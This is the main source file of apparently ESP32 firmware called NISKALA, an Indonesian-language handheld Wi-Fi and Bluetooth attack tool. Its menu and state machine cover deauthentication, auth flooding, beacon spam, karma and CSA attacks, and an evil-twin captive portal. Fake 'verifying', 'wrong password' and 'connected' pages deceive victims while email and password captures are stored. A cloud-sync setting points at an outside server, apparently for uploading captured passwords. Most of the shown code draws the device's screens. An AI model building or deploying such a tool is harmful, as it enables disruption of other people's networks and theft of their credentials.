#include <Arduino.h>
#include <WiFi.h>
#include <TFT_eSPI.h>
#include <esp_wifi.h>
#include <ping/ping_sock.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Preferences.h>
#include <ArduinoOTA.h>
#include <HTTPClient.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#include "disclaimer.h"
#include "attack_engine.h"
#include "karma.h"
#include "templates.h"
#include "bt_spam.h"

void restoreOriginalApMac();
void resetWifiStateAfterAttack();

TFT_eSPI tft = TFT_eSPI();
Preferences prefs;
Preferences apPrefs;

#define BTN_TOP 0
#define BTN_BOTTOM 35
#define BAT_PIN 34
#define FW_VERSION "3.1"
// Kredensial opsional dari src/secrets.h (file lokal, TIDAK di-commit).
#if __has_include("secrets.h")
  #include "secrets.h"
#endif

#ifndef NISKALA_WIFI_SSID
  #define NISKALA_WIFI_SSID ""
#endif
#ifndef NISKALA_WIFI_PASS
  #define NISKALA_WIFI_PASS ""
#endif
#ifndef NISKALA_SYNC_API_KEY
  #define NISKALA_SYNC_API_KEY ""
#endif

#define SYNC_API_KEY NISKALA_SYNC_API_KEY

const int MAX_VERIFY_ATTEMPTS = 5;
const unsigned long VERIFY_TIMEOUT_MS = 6000;
const unsigned long RELEASE_DELAY_MS = 2000;
const unsigned long SUCCESS_HOLD_MS = 4000;

enum State {
  MAIN_MENU,
  AP_SCANNING,
  AP_LIST_DEAUTH,
  AP_LIST_EVIL_TWIN,
  AP_LIST_AUTH_FLOOD,
  AP_LIST_CSA,
  TEMPLATE_SELECT,
  FETCH_TEMPLATE,
  DEAUTH_MENU,
  AUTH_FLOOD_RUNNING,
  EVIL_TWIN_RUNNING,
  BEACON_SPAM,
  PROBE_SNIFF,
  GLOBAL_DEAUTH,
  BT_SPAM,
  VIEW_PASSWORDS,
  KARMA_SCAN,
  KARMA_RESULTS,
  CSA_RUNNING,
  WEB_REMOTE,
  OTA_MODE,
  BLE_SCAN,
  CLOUD_SYNC,
  MACRO_MENU,
  MACRO_RUNNING,
  AP_LIST_CLIENT,
  CLIENT_MONITOR_RUNNING,
  RECON_AP_SELECT,
  RECON,
  APWIFI_VIEW
};
State currentState = MAIN_MENU;

#include "web_remote.h"

int menuSelection = 0;
int menuScrollPos = 0;
const int MENU_COUNT = 18;
const char* menuItems[] = {
  "DEAUTH MANUAL",
  "EVIL TWIN",
  "BEACON SPAM",
  "PROBE SNIFF",
  "GLOBAL DEAUTH",
  "AUTH FLOOD",
  "BLUETOOTH SPAM",
  "PASSWORD",
  "KARMA ATTACK",
  "CSA ATTACK",
  "WEB REMOTE",
  "OTA UPDATE",
  "BLE SCAN",
  "CLOUD SYNC",
  "MACRO",
  "CLIENT MONITOR",
  "NETWORK RECON",
  "AP WIFI"
};

volatile AttackMode g_attackMode = ATK_IDLE;
volatile uint32_t g_packetsSent = 0;
volatile uint32_t g_txErrors = 0;
uint8_t g_originalApMac[6] = {0,0,0,0,0,0};
volatile bool g_victimFound = false;
uint8_t g_victimMAC[6] = {0};
uint8_t g_targetBSSID[6] = {0};
volatile uint8_t g_targetChannel = 1;
char g_csaTargetSSID[33] = {0};

// Parameter serangan runtime (diubah via Web Remote, disimpan di NVS)
int cfg_deauth_burst = 5;
int cfg_auth_burst = 20;
int cfg_hop_interval_ms = 120;
int cfg_beacon_hop_ms = 100;
int cfg_deauth_reason = 0;
String cfg_wifi_ssid = NISKALA_WIFI_SSID;
String cfg_wifi_pass = NISKALA_WIFI_PASS;
String cfg_server_url = "https://niskalasys.my.id/sync.php";
String cfg_template_url = "https://niskalasys.my.id/template.html";
String g_customTemplate = "";
bool useCustomTemplate = false;
int cfg_autosync_min = 0;
unsigned long lastAutoSync = 0;
#define CLOUD_PHASE_IDLE 0
#define CLOUD_PHASE_CONNECTING 1
#define CLOUD_PHASE_SENDING 2
#define CLOUD_PHASE_DONE 3
int g_cloudPhase = CLOUD_PHASE_IDLE;
unsigned long g_cloudTimer = 0;
#define TPL_PHASE_IDLE 0
#define TPL_PHASE_CONNECTING 1
#define TPL_PHASE_GETTING 2
int g_tplPhase = TPL_PHASE_IDLE;
unsigned long g_tplTimer = 0;

unsigned long evilTwinStartTime = 0;

ProbeEntry g_probeLog[PROBE_LOG_SIZE];
volatile int g_probeLogHead = 0;
volatile int g_probeLogCount = 0;
portMUX_TYPE g_probeLogMux = portMUX_INITIALIZER_UNLOCKED;

// Karma data
KarmaSSIDEntry g_karmaSSIDs[KARMA_MAX_SSIDS];
int g_karmaSSIDCount = 0;
KarmaClientEntry g_karmaClients[KARMA_MAX_CLIENTS];
int g_karmaClientCount = 0;
volatile uint32_t g_karmaResponses = 0;
volatile bool g_karmaActiveMode = true;

// Karma UI state
bool isKarmaRunning = false;
unsigned long karmaScanStart = 0;
int karmaSelection = 0;
int karmaScrollPos = 0;

bool isDeauthRunning = false;
bool isEvilTwinRunning = false;
bool isBeaconRunning = false;
bool isProbeRunning = false;
bool isGlobalDeauthRunning = false;
bool isAuthFloodRunning = false;
bool isBTSpamRunning = false;
bool isCSARunning = false;             // [CSA]
bool isWebRemoteRunning = false;
bool isOtaRunning = false;
bool isMacroRunning = false;
int macroIndex = 0;
int macroPhase = 0;
int macroSelection = 0;
unsigned long macroPhaseStart = 0;
String cliBuf = "";

// Screensaver (dim + particle orbit)
bool screensaverActive = false;
unsigned long lastActivity = 0;
unsigned long lastScreensaverDraw = 0;
int screensaverFrame = 0;
#define SCREENSAVER_IDLE_MS 45000
#define BL_DIM 51
#define BL_FULL 255
bool isClientMonitorRunning = false;
int clientSelection = 0;
int clientScroll = 0;
ClientEntry g_clients[CLIENT_MAX];
int g_clientCount = 0;
portMUX_TYPE g_clientMux = portMUX_INITIALIZER_UNLOCKED;
bool g_bleScanning = false;

#define RECON_MAX_HOSTS 20
#define RECON_MAX_PORTS 14
#define MAX_AP_WIFI 20
#define RECON_PHASE_CONNECTING 0
#define RECON_PHASE_SWEEP 1
#define RECON_PHASE_HOST_LIST 2
#define RECON_PHASE_PORT_SCAN 3
#define RECON_PHASE_BANNER 4
#define RECON_PHASE_PORT_RESULT 5
IPAddress g_reconHosts[RECON_MAX_HOSTS];
int g_reconHostCount = 0;
int g_reconSelection = 0;
int g_reconScroll = 0;
int g_reconPhase = RECON_PHASE_HOST_LIST;
int g_reconOpenPorts[RECON_MAX_PORTS];
int g_reconOpenPortCount = 0;
IPAddress g_reconSelectedIP;
bool isReconRunning = false;
int g_reconSelectedAuth = -1;
uint32_t g_reconFirst = 0;
uint32_t g_reconLast = 0;
uint32_t g_reconNext = 0;
uint32_t g_reconTotal = 0;
uint32_t g_reconScanned = 0;
unsigned long g_reconConnectStart = 0;
int g_reconPortIndex = 0;
int g_reconBannerIndex = 0;
IPAddress g_reconLocalIP;
IPAddress g_reconGateway;
IPAddress g_reconSubnet;
char g_reconBanners[RECON_MAX_PORTS][40];
WiFiClient g_reconClient;
unsigned long g_bleScanStart = 0;

#define BLE_SCAN_MAX 32
struct BleScanEntry {
  char mac[18];
  char name[33];
  int8_t rssi;
  unsigned long lastSeen;
  bool used;
};
BleScanEntry g_bleScanLog[BLE_SCAN_MAX];
int g_bleScanCount = 0;
bool transientActive = false;
unsigned long transientUntil = 0;
uint8_t transientMode = 0;
String targetSSID = "";
int apCount = 0;
int selectedIdx = 0;
int g_scanPendingMenu = -1;
int g_scanFrame = 0;
unsigned long g_scanLastDraw = 0;
int apScrollPos = 0;

int selectedTemplateIdx = 0;
int templateSelection = 0;

int viewSelection = 0;
int viewScrollPos = 0;
bool confirmDeleteAll = false;
unsigned long lastDeletePress = 0;
int apWifiSelection = 0;
int apWifiScrollPos = 0;
bool confirmApWifiDelete = false;
unsigned long lastApWifiDeletePress = 0;
const int MAX_SAVED_PWDS = 50;

DNSServer dnsServer;
WebServer server(80);
String capturedEmail = "";
String capturedPass = "";
bool isReleasing = false;
bool isVerifying = false;
bool verificationResult = false;
unsigned long releaseTimer = 0;
unsigned long verifyStart = 0;
const byte DNS_PORT = 53;

int verifyState = 0;
int verifyAttempts = 0;
unsigned long releaseAfterSuccess = 0;

TaskHandle_t attackTaskHandle = NULL;

// ═══════════════════════════════════════════════
// HTML halaman status portal
// ═══════════════════════════════════════════════
const char HTML_VERIFYING[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="10;url=/">
<title>Memverifikasi</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.spin{border:4px solid #eef2f5;border-top:4px solid #1e88e5;border-radius:50%;
width:52px;height:52px;animation:sp .9s linear infinite;margin:0 auto 20px}
@keyframes sp{to{transform:rotate(360deg)}}
h2{margin:0 0 8px;color:#1e88e5;font-size:20px}p{margin:0;color:#6b7280;font-size:14px}
</style></head><body><div class="card"><div class="spin"></div><h2>Memverifikasi...</h2>
<p>Mohon tunggu sebentar</p></div></body></html>
)raw";

const char HTML_SUCCESS[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Terhubung</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.ok{width:64px;height:64px;border-radius:50%;background:#22c55e;color:#fff;font-size:36px;
display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
h2{margin:0 0 8px;color:#22c55e;font-size:22px}p{margin:0;color:#6b7280;font-size:14px}
</style></head><body><div class="card"><div class="ok">&#10003;</div>
<h2>Terhubung!</h2><p>Anda sekarang online</p></div></body></html>
)raw";

const char HTML_ERROR[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Password Salah</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.err{width:64px;height:64px;border-radius:50%;background:#ef4444;color:#fff;font-size:36px;
display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
h2{margin:0 0 8px;color:#ef4444;font-size:22px}p{margin:0 0 22px;color:#6b7280;font-size:14px}
a{display:inline-block;padding:14px 32px;background:#1e88e5;color:#fff;text-decoration:none;
border-radius:10px;font-weight:600;font-size:15px}
</style></head><body><div class="card"><div class="err">&#10005;</div>
<h2>Password Salah</h2><p>Silakan coba lagi</p><a href="/">Coba Lagi</a></div></body></html>
)raw";

// ═══════════════════════════════════════════════
// UI helpers
// ═══════════════════════════════════════════════
void drawGlowText(String text, int x, int y, uint16_t mainColor, uint16_t glowColor) {
  tft.setTextColor(glowColor);
  tft.drawString(text, x+1, y); tft.drawString(text, x-1, y);
  tft.drawString(text, x, y+1); tft.drawString(text, x, y-1);
  tft.setTextColor(mainColor);
  tft.drawString(text, x, y);
}

void drawCornerBrackets(int x, int y, int w, int h, uint16_t color) {
  int len = 5;
  tft.drawLine(x, y, x+len, y, color); tft.drawLine(x, y, x, y+len, color);
  tft.drawLine(x+w-len, y, x+w, y, color); tft.drawLine(x+w, y, x+w, y+len, color);
  tft.drawLine(x, y+h-len, x, y+h, color); tft.drawLine(x, y+h, x+len, y+h, color);
  tft.drawLine(x+w-len, y+h, x+w, y+h, color); tft.drawLine(x+w, y+h-len, x+w, y+h, color);
}

void drawMenuIcon(int idx, int x, int y, uint16_t color) {
  switch(idx) {
    case 0:
      tft.fillTriangle(x+5, y, x, y+8, x+5, y+6, color);
      tft.fillTriangle(x+5, y+6, x+5, y+14, x+10, y+6, color);
      break;
    case 1:
      tft.drawCircle(x+5, y+7, 5, color); tft.drawCircle(x+9, y+7, 5, color);
      break;
    case 2:
      tft.fillCircle(x+5, y+7, 2, color);
      tft.drawCircle(x+5, y+7, 5, color); tft.drawCircle(x+5, y+7, 8, color);
      break;
    case 3:
      tft.drawCircle(x+6, y+6, 4, color); tft.drawLine(x+9, y+9, x+13, y+13, color);
      break;
    case 4:
      tft.drawCircle(x+7, y+7, 5, color);
      tft.drawLine(x+7, y+1, x+7, y+13, color);
      tft.drawLine(x+1, y+7, x+13, y+7, color);
      break;
    case 5:
      tft.fillRect(x+2, y+2, 10, 10, color);
      tft.drawLine(x+4, y+4, x+10, y+10, TFT_BLACK);
      break;
    case 6:
      tft.drawLine(x+6, y, x+6, y+10, color);
      tft.drawLine(x+6, y+10, x+2, y+14, color);
      tft.drawLine(x+6, y+10, x+10, y+14, color);
      tft.drawCircle(x+6, y+4, 2, color);
      break;
    case 7:
      tft.drawCircle(x+4, y+5, 3, color);
      tft.drawLine(x+6, y+7, x+10, y+11, color);
      tft.drawLine(x+10, y+11, x+8, y+13, color);
      break;
    case 8:
      tft.drawCircle(x+7, y+7, 7, color);
      tft.drawCircle(x+7, y+7, 4, color);
      tft.fillCircle(x+7, y+7, 2, color);
      tft.drawLine(x+7, y, x+7, y+14, color);
      tft.drawLine(x, y+7, x+14, y+7, color);
      break;
    case 9:
      tft.drawCircle(x+7, y+7, 7, color);
      tft.drawLine(x+2, y+7, x+12, y+7, color);
      tft.drawLine(x+7, y+2, x+7, y+12, color);
      tft.drawLine(x+4, y+4, x+10, y+10, color);
      tft.drawLine(x+10, y+4, x+4, y+10, color);
      break;
    case 10:
      tft.drawRect(x+1, y+3, 10, 8, color);
      tft.drawLine(x+11, y+5, x+13, y+7, color);
      tft.drawLine(x+11, y+9, x+13, y+7, color);
      tft.fillRect(x+3, y+5, 6, 4, color);
      break;
    case 11:
      tft.drawLine(x+7, y+2, x+7, y+11, color);
      tft.drawLine(x+3, y+6, x+7, y+2, color);
      tft.drawLine(x+11, y+6, x+7, y+2, color);
      tft.drawFastHLine(x+2, y+13, 10, color);
      break;
    case 12:
      tft.drawCircle(x+7, y+7, 7, color);
      tft.drawLine(x+7, y+7, x+12, y+4, color);
      tft.drawLine(x+7, y+7, x+2, y+10, color);
      break;
    case 13:
      tft.drawCircle(x+7, y+4, 3, color);
      tft.drawCircle(x+7, y+4, 6, color);
      tft.drawFastHLine(x+2, y+12, 10, color);
      tft.drawLine(x+7, y+12, x+7, y+9, color);
      break;
    case 14:
      tft.drawRect(x+2, y+4, 10, 7, color);
      tft.drawRect(x+4, y+2, 6, 7, color);
      tft.drawLine(x+7, y+9, x+7, y+13, color);
      break;
    case 15:
      tft.drawCircle(x+7, y+7, 4, color);
      tft.drawCircle(x+7, y+7, 7, color);
      tft.drawFastHLine(x+2, y+13, 10, color);
      break;
    case 16:
      tft.drawCircle(x+7, y+7, 4, color);
      tft.drawCircle(x+7, y+7, 7, color);
      tft.drawLine(x+7, y+1, x+7, y+13, color);
      tft.drawLine(x+1, y+7, x+13, y+7, color);
      break;
    case 17:
      tft.drawCircle(x+4, y+3, 3, color);
      tft.drawLine(x+6, y+5, x+13, y+12, color);
      tft.drawLine(x+9, y+12, x+13, y+12, color);
      tft.drawLine(x+13, y+9, x+13, y+12, color);
      break;
  }
}

void drawHeader(String title, uint16_t bgColor) {
  tft.fillRect(0, 0, 240, 24, bgColor);
  tft.setTextDatum(MC_DATUM); tft.setTextFont(2);
  tft.setTextColor(TFT_WHITE, bgColor);
  tft.drawString(title, 120, 12);
  tft.drawFastHLine(0, 24, 240, TFT_DARKGREY);
  tft.setTextDatum(TL_DATUM);
}

void drawFooter(String hint) {
  tft.drawFastHLine(0, 115, 240, TFT_DARKGREY);
  tft.fillRect(0, 116, 240, 19, TFT_BLACK);
  tft.setTextDatum(MC_DATUM); tft.setTextFont(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(hint, 120, 125);
  tft.setTextDatum(TL_DATUM);
}

// ═══════════════════════════════════════════════
// Splash & scan
// ═══════════════════════════════════════════════
void drawElegantSplash() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextDatum(MC_DATUM);
  
  tft.drawFastHLine(30, 10, 180, TFT_DARKCYAN);
  tft.drawFastHLine(60, 12, 120, TFT_DARKCYAN);
  
  tft.setTextFont(4);
  drawGlowText("N I S K A L A", 120, 35, TFT_GREEN, TFT_DARKGREEN);
  
  tft.setTextFont(1); 
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("To be invisible is not to be absent", 120, 55);
  
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("Etika > Skill | Adab > Ilmu", 120, 68);
  
  tft.drawFastHLine(30, 78, 180, TFT_DARKCYAN);
  tft.drawFastHLine(60, 80, 120, TFT_DARKCYAN);

  int barX = 40, barY = 95, barW = 160, barH = 10;
  tft.drawRect(barX, barY, barW, barH, TFT_WHITE);
  
  for (int p = 0; p <= 100; p += 4) {
    tft.fillRect(barX+1, barY+1, (p*(barW-2))/100, barH-2, TFT_GREEN);
    
    tft.setTextFont(1); 
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Booting " + String(p) + "%", 120, 85);
    delay(15); 
  }
  
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("System Ready", 120, 115);
  
  delay(400); 
  tft.setTextDatum(TL_DATUM);
}

void drawScanAnimation(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("SCANNING WIFI...", TFT_DARKGREEN);
  tft.setTextFont(2); tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 32);
  tft.print("Mencari jaringan");
  for (int i = 0; i < (frame % 4); i++) tft.print(".");
  int cx = 120, cy = 78;
  for (int i = 0; i < 3; i++) {
    int r = (frame * 3 + i * 18) % 55;
    if (r > 3) tft.drawCircle(cx, cy, r, (r < 25) ? TFT_GREEN : TFT_DARKGREEN);
  }
  tft.fillCircle(cx, cy, 4, (frame % 6 < 3) ? TFT_GREEN : TFT_YELLOW);
  drawFooter("TEKAN TOMBOL = BATAL");
}

// ═══════════════════════════════════════════════
// Main menu
// ═══════════════════════════════════════════════
int readBatteryPercent() {
  float v = (float)analogReadMilliVolts(BAT_PIN) / 1000.0f * 2.0f;
  int pct = (int)((v - 3.3f) / (4.2f - 3.3f) * 100.0f);
  if (pct < 0) pct = 0;
  if (pct > 100) pct = 100;
  return pct;
}

float readBatteryVoltage() {
  return (float)analogReadMilliVolts(BAT_PIN) / 1000.0f * 2.0f;
}

void drawMainMenu() {
  tft.fillScreen(TFT_BLACK);
  String pwdCount = String(prefs.getInt("pwd_count", 0));
  String statusRight = "BAT:" + String(readBatteryPercent()) + "% T:" + String((int)temperatureRead()) + "C P:" + pwdCount;

  // Header
  tft.fillRect(0, 0, 240, 24, TFT_DARKGREEN);
  tft.setTextDatum(ML_DATUM); tft.setTextFont(2);
  tft.setTextColor(TFT_WHITE, TFT_DARKGREEN);
  tft.drawString("NISKALA", 8, 12);
  tft.setTextDatum(MR_DATUM); tft.setTextFont(1);
  tft.setTextColor(TFT_CYAN, TFT_DARKGREEN);
  tft.drawString(statusRight, 232, 12);
  tft.drawFastHLine(0, 24, 240, TFT_CYAN);
  tft.setTextDatum(TL_DATUM);

  // Satu menu per layar (font besar)
  int idx = menuSelection;
  // Ikon modul (tanpa bingkai siku)
  drawMenuIcon(idx, 112, 48, TFT_GREEN);

  tft.setTextDatum(MC_DATUM);
  String label = String(menuItems[idx]);
  tft.setTextFont(4);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString(label, 120, 86);

  tft.setTextFont(2);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(String(idx + 1) + " / " + String(MENU_COUNT), 120, 122);
  tft.setTextDatum(TL_DATUM);

  drawFooter("ATAS: Pilih | BAWAH: OK");
}

// ═══════════════════════════════════════════════
// AP list
// ═══════════════════════════════════════════════
void drawSignalBars(int cx, int y, int rssi, uint16_t color) {
  int pct = 0;
  if (rssi > -60) pct = 4;
  else if (rssi > -70) pct = 3;
  else if (rssi > -80) pct = 2;
  else if (rssi > -90) pct = 1;
  for (int i = 0; i < 4; i++) {
    int bh = 5 + i * 4;
    int bx = cx - 14 + i * 8;
    uint16_t c = (i < pct) ? color : TFT_DARKGREY;
    tft.fillRect(bx, y + 20 - bh, 6, bh, c);
  }
}

void drawBackIcon(int cx, int cy, uint16_t color) {
  tft.drawLine(cx + 8, cy - 6, cx - 4, cy, color);
  tft.drawLine(cx - 4, cy, cx + 8, cy + 6, color);
  tft.drawFastHLine(cx - 8, cy, 16, color);
}

void drawTemplateIconBig(int idx, int cx, int cy, uint16_t color) {
  if (idx == 5) {
    tft.drawCircle(cx - 7, cy + 3, 6, color);
    tft.drawCircle(cx + 1, cy - 1, 7, color);
    tft.drawCircle(cx + 9, cy + 3, 6, color);
    tft.drawFastHLine(cx - 8, cy + 8, 16, color);
  } else {
    tft.drawRect(cx - 9, cy - 7, 18, 14, color);
    tft.drawFastHLine(cx - 9, cy - 3, 18, color);
    tft.drawFastHLine(cx - 9, cy + 1, 18, color);
  }
}

void drawAPList() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("PILIH TARGET AP", TFT_NAVY);

  int idx = selectedIdx;
  tft.setTextDatum(MC_DATUM);

  if (idx < apCount) {
    int rssi = WiFi.RSSI(idx);
    drawSignalBars(120, 30, rssi, TFT_CYAN);

    String ssid = WiFi.SSID(idx);
    bool hidden = (ssid.length() == 0);
    if (hidden) {
      ssid = "(HIDDEN)";
    } else if (ssid.length() > 12) {
      ssid = ssid.substring(0, 12);
    }

    tft.setTextFont(4);
    tft.setTextColor(hidden ? TFT_ORANGE : TFT_CYAN, TFT_BLACK);
    tft.drawString(ssid, 120, 58);

    tft.setTextFont(2);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("CH " + String(WiFi.channel(idx)) + "  |  " + String(rssi) + " dBm", 120, 84);

    tft.setTextFont(1);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString(WiFi.BSSIDstr(idx), 120, 104);
  } else {
    drawBackIcon(110, 46, TFT_GREEN);

    tft.setTextFont(4);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("KEMBALI", 120, 68);

    tft.setTextFont(2);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("ke menu utama", 120, 100);
  }

  tft.setTextDatum(TL_DATUM);
  drawFooter("ATAS: Pilih | BAWAH: OK");
}

// ═══════════════════════════════════════════════
// Template select
// ═══════════════════════════════════════════════
void drawTemplateSelect() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("PILIH TEMPLATE PORTAL", TFT_DARKCYAN);

  int idx = templateSelection;
  drawTemplateIconBig(idx, 120, 36, TFT_CYAN);

  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(getTemplateName(idx), 120, 68);

  tft.setTextFont(2);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.drawString(String(idx + 1) + " / " + String(TEMPLATE_COUNT), 120, 100);

  tft.setTextDatum(TL_DATUM);
  drawFooter("ATAS: Pilih | BAWAH: OK");
}

// ═══════════════════════════════════════════════
// Deauth menu
// ═══════════════════════════════════════════════
void drawDeauthMenu() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("DEAUTH MANUAL", TFT_MAROON);
  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);

  tft.setCursor(10, 26); tft.print("Target: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String s = targetSSID; if (s.length() > 16) s = s.substring(0, 16);
  tft.println(s);

  tft.setCursor(10, 46); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Status: ");
  if (isDeauthRunning) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("MENEMBAK"); }
  else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.println("BERHENTI"); }

  tft.setCursor(10, 66); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println(g_packetsSent);

  tft.setCursor(10, 86); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Error: ");
  tft.setTextColor(g_txErrors > 0 ? TFT_RED : TFT_DARKGREY, TFT_BLACK);
  tft.println(g_txErrors);

  drawFooter("BAWAH: Start/Stop | ATAS: Keluar");
}

void drawAuthFlood(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("AUTH FLOOD", TFT_MAROON);
  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 26); tft.print("Target: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String s = targetSSID; if (s.length() > 16) s = s.substring(0, 16);
  tft.println(s);
  tft.setCursor(10, 48); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println(g_packetsSent);
  tft.setCursor(10, 70); tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.print("Flooding auth request");
  for (int i = 0; i < (frame % 4); i++) tft.print(".");
  int cx = 200, cy = 88;
  for (int i = 0; i < 3; i++) {
    int r = (frame * 4 + i * 12) % 28;
    if (r > 2) tft.drawCircle(cx, cy, r, r < 14 ? TFT_RED : TFT_MAROON);
  }
  drawFooter("TEKAN TOMBOL = STOP");
}

void drawGlobalDeauth(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("GLOBAL DEAUTH", TFT_RED);
  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30); tft.print("Mode: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("CHANNEL HOP");
  tft.setCursor(10, 52); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println(g_packetsSent);
  int cx = 120, cy = 88;
  for (int i = 0; i < 3; i++) {
    int r = (frame * 4 + i * 15) % 30;
    if (r > 2) tft.drawCircle(cx, cy, r, r < 15 ? TFT_RED : TFT_MAROON);
  }
  tft.fillCircle(cx, cy, 3, TFT_YELLOW);
  drawFooter("TEKAN TOMBOL = STOP");
}

void drawBeaconSpam(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("BEACON SPAM", TFT_PURPLE);
  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30); tft.print("SSID pool: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println(SPAM_COUNT);
  tft.setCursor(10, 52); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Beacon: ");
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println(g_packetsSent);
  tft.setCursor(10, 74); tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.print("Broadcasting");
  for (int i = 0; i < (frame % 4); i++) tft.print(".");
  int cx = 200, cy = 88;
  for (int i = 0; i < 3; i++) {
    int r = (frame * 3 + i * 8) % 25;
    if (r > 2) tft.drawCircle(cx, cy, r, r < 12 ? TFT_PURPLE : TFT_MAGENTA);
  }
  tft.fillCircle(cx, cy, 2, TFT_PINK);
  drawFooter("TEKAN TOMBOL = STOP");
}

// [FIX] snapshot probe log dengan critical section
const char* vendorFromMacBytes(const uint8_t* m) {
  uint32_t oui = ((uint32_t)m[0] << 16) | ((uint32_t)m[1] << 8) | m[2];
  switch (oui) {
    case 0xACBC32: case 0x8C8590: case 0xF01898: case 0x308D99: case 0x3C22FB:
      return "Apple";
    case 0x8C0D76: case 0xCC07AB: case 0x3C64EA:
      return "Samsung";
    case 0x640980: case 0x7811DC: case 0xF0B429: case 0x8C4B14:
      return "Xiaomi";
    case 0x00E0FC: case 0x286ED4: case 0xD80BCB:
      return "Huawei";
    case 0x546009: case 0x3C5AB4:
      return "Google";
    case 0x0050F2: case 0x2816A8:
      return "Microsoft";
    case 0x001302: case 0x340286:
      return "Intel";
    case 0x50C7BF: case 0xA42BB0:
      return "TP-Link";
    case 0x502B98: case 0x086438:
      return "Realme";
    case 0x08D46A: case 0x702C1F:
      return "Oppo";
    case 0x241177: case 0x7802F8:
      return "Vivo";
    case 0x0024BE: case 0x405BAD:
      return "Sony";
    case 0x0C8BFD: case 0xE05B70:
      return "OnePlus";
    case 0x0015EB: case 0x286C07:
      return "ZTE";
    default:
      return "Unknown";
  }
}

const char* vendorFromMacStr(const char* macStr) {
  int a[6] = {0};
  sscanf(macStr, "%x:%x:%x:%x:%x:%x", &a[0], &a[1], &a[2], &a[3], &a[4], &a[5]);
  uint8_t m[6] = {(uint8_t)a[0], (uint8_t)a[1], (uint8_t)a[2], (uint8_t)a[3], (uint8_t)a[4], (uint8_t)a[5]};
  return vendorFromMacBytes(m);
}

void drawProbeSniff(int frame) {
  tft.fillScreen(TFT_BLACK);
  drawHeader("PROBE SNIFFER", TFT_DARKCYAN);
  tft.setTextFont(1); tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(4, 28); tft.print("VENDOR    HIT  RSSI  SSID");

  ProbeEntry snapshot[4];
  int count, show;
